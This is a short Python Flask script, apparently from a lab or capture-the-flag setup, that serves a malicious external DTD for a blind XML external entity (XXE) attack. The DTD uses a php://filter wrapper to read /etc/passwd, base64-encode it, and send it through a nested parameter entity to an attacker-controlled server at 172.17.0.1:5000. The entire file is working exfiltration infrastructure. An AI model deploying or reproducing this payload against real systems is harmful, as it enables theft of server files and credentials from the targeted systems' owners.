from flask import Flask

app = Flask(__name__)

# your docker host
host = "172.17.0.1"


@app.route('/malcious.dtd', methods=['GET'])
def dtd():
    return f"""
<!ENTITY % file SYSTEM 'php://filter/convert.base64-encode/resource=/etc/passwd'>
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://{host}:5000/?file=%file;'>">
%eval;
%exfiltrate;
    """.strip()


if __name__ == '__main__':
    app.run(host, 5000, debug=True)
